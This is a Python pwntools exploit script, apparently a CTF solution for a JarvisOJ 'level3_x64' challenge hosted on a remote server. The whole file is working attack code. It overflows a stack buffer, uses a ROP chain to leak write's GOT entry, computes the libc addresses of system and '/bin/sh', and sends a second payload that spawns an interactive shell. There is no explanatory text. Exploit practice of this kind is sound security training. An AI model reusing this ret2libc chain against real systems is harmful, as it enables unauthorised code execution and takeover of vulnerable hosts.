from pwn import *

p = remote('pwn2.jarvisoj.com', 9883)
# p = process('./level3_x64')
msg = p.recv(20)
print msg
vuln_addr = 0x00000000004005e6

libc = ELF('libc-2.19.so')
level3 = ELF('level3_x64')

libc_write_addr = libc.symbols['write']
libc_system_addr = libc.symbols['system']
level3_write_plt_addr = level3.plt['write']
level3_write_got_addr = level3.got['write']
print hex(level3_write_plt_addr)
print hex(level3_write_got_addr)
# bss_addr = 0x600a88
# rop0 = 0x400550 # pop rbp ; ret
# rop0 = 0x400633
rop0 = 0x4006b3 # pop rdi ; ret
rop1 = 0x4006b1 # pop rsi ; pop r15 ; ret

payload = 'A'* 136
payload += p64(rop0) + p64(1)
payload += p64(rop1) + p64(level3_write_got_addr) + p64(0)
payload += p64(level3_write_plt_addr) + p64(vuln_addr)
with open('in.txt', 'w') as f:
    f.write(payload)
p.send(payload)

write_addr = u64(p.recv(8))
print hex(write_addr)
level3_system_addr = write_addr - (libc_write_addr - libc_system_addr)
#
libc_binsh_addr = next(libc.search('/bin/sh'))
print hex(libc_binsh_addr)
binsh_addr = write_addr - (libc_write_addr - libc_binsh_addr)

payload2 = 'A'* 136 + p64(rop0) + p64(binsh_addr) + p64(level3_system_addr) + p64(vuln_addr)
#
p.send(payload2)
p.interactive()
